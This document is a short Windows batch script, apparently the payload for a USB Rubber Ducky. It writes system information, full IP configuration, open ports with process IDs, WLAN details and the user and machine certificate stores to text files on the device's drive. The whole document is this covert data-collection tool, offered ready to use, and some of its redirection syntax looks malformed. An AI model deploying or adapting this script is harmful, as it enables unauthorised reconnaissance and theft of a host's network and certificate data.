@echo off
REM Remember to change "E:\" with your current rubber ducky drive letter
cd /D E:\output
REM The \output directory must be created before, otherwise you can type your own PATH
	systeminfo 1>&2> .\sysinfo.txt
	ipconfig /all 1>&2> .\ipconfig.txt
	netstat -nao 1>&2> .\hostports.txt;
	netsh wlan show all 1>&2> .\wlanstat.txt;
	certutil -store -user -silent my 1>&2> .\certificates.txt;
	certutil -store -silent my 1>>&2>> .\certificates.txt
exit
